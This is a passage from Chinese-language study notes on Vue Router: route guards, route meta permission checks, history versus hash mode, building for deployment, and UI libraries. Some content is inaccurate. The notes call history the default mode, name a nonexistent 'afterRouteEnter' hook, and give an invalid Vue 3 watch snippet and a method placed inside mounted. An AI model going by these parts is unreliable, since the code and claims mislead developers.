* to：下一步去哪，被包装为对象了
* next：**需要调用next才能放行**

可以根据具体需求，去哪个路径或名称拦截等

**Index.js**

```javascript
const router = {...}
router.beforeEach((to,from,next) => {
    console.log(to,from)
    if(to.path === '/home/news' || to.path === '/home/message'){
        if(localStorage.getItem('school') === 'atguigu'){
            next()
        }else{
            alert('学校名不对，无权限查看')
        }
    }else{
        next()
    }
})
export default router
```

在router中，对象为配置对象，不允许除了给定的几个配置对象之外再加任何的配置属性

**我们可以往meta里边放一些程序员自己写的配置，叫路由元信息**

如果很多跳转都需要检定权限，上述那种 || 的写法太麻烦了

我们可以在需要检定权限的route里边的meta配置isAuth（这个名自己起），如果为真则需要检定权限

```javascript
{
                    path:'news',
                    component:News,
                    meta:{
                        isAuth:false //权限校验
                    }
                },
...
router.beforeEach((to,from,next) => {
    console.log(to,from)
    // if(to.path === '/home/news' || to.path === '/home/message'){
    if(to.meta.isAuth){
        if(localStorage.getItem('school') === 'atguigu'){
            next()
        }else{
            alert('学校名不对，无权限查看')
        }
    }else{
        next()
    }
})
```

### 全局后置的路由守卫

后置路由守卫当切换页面完成后才调用，只有两个参数to和from，没有Next

一般比较完备的项目会配置这个

例如：给每个路由都配置一个标题，在切换组件的时候更改页面标题

如果在没有权限的情况下访问某一个路由，在前置守卫写的切换标题需要在检测放行和不检测写两边切换标题的dom

所以类似这种场景建议写在后置的路由守卫

```javascript
router.afterEach((to,from) => {
    document.title = to.meta.title || '硅谷系统'
})
```

### 独享路由守卫

beforeEnter是一个路由的配置项，和beforeEach用法一样

**独享路由守卫只有前置守卫，没后置守卫**，可以用全局的后置路由守卫代替

```javascript
{
                    name:'xinwen',
                    path:'news',
                    component:News,
                    meta:{
                        isAuth:false, //权限校验
                        title:'新闻'
                    },
                    beforeEnter: (to, from, next) => {

                    },
                },
```

### 组件内路由守卫

以/home->/about->/test为例

* 从home切换到about，切换之前调用前置路由守卫，切换之后调用后置路由守卫，是针对“切换”这个动作
* 当从home进入about之前，about的beforeRouteEnter被调用，当在about切换到test时，在离开页面之前会调用about的afterRouterEnter，是针对“about”这个动作
  * **即beforeRouteEnter是通过路由规则，进入组件是（还没进入）被调用，注意是一定要通过路由**
  * **afterRouteEnter是通过路由规则，离开组件时被调用，注意是一定要通过路由**
  * 进入的to一定是about，离开的from一定是about
* 也是不可以通过afterRouteEnter改变页面标题，必须通过全局后置守卫

**about.vue**

```javascript
export default {
    name: 'About',
    mounted() {
        // console.log("About", this)
    },
    //通过路由规则，进入该规则时被调用
    beforeRouteEnter(to, from, next) {
        // console.log("about进入组件",to, from)
        if (to.meta.isAuth) {
            if (localStorage.getItem('school') === 'atguigu') {
                next()
            } else {
                alert('学校名不对，无权限查看')
            }
        } else {
            next()
        }
    },
    //通过路由规则，离开该组件时被调用
    beforeRouteLeave(to, from, next){
        // console.log("about离开路由守卫",to,from)
        next()
    }
}
```

## 13_history模式与hash模式

严格来说，路径里边的从#/开始的所有东西都算hash值。hash值最大的特点是不会随http请求发给服务器。

例如：`http://localhost:5000/students/#/asfsafsfsaf/1321313213` ->传给服务器 是`http://localhost:5000/students/`

**router.vue**

```javascript
const router = new VueRouter({
    mode:'history',
    routes:[...]
```

* 在路由器中需要配置`mode:history`开启history模式，默认是历史模式
* history模式路径没有#/，hash模式有#/
* history模式兼容性略差，当上线刷新时浏览器会把路由部分的路径当成地址请求报404，需要后端解决了 在服务器利用connect-history插件
*  若以后将地址通过第三方手机app分享，若app校验较为严格，则地址会被标记为不合法

### 部署项目到服务器上

* npm run serve指的是测试时开一个内置的8080服务器
* npm run build指的是把所有的脚手架vue等生成最纯粹的html、css、js（**以下统称为静态资源**）。会生成一个dist打包文件，这个文件需要部署到服务器上

服务器部署不做过多介绍，详情请移步至node.js

# 第七章：UI组件库

* 移动常用UI组件库：
  * Vant  https://youzan.github.io/vant/
  * Cube UI  https://didi.github.io/cube-ui
  * Mint UI http://mint-ui.github.io
* PC端常用组件库
  * Element UI https://element.eleme.cn
  * IView UI https://www.iviewui.co

注意按需引入

注意复习WebPack和ES6

```
//父组件
<xxx @like="likeEvent"></xxx>
<script>
	mounted(){
		likeEvent(参数){
		
		}
}
</script>

//子组件
<script>
	this.$emit("like", 参数)
</script>
```

```
//vue2
watch: {
			cmData: {
				handler: function(newVal, oldVal) {
					this.init(newVal);
				},
				immediate: true
			}
		},
		
//vue3
watch(() => {
	cmData: {
				handler: function(newVal, oldVal) {
					this.init(newVal);
				},
				immediate: true
			}
})
```

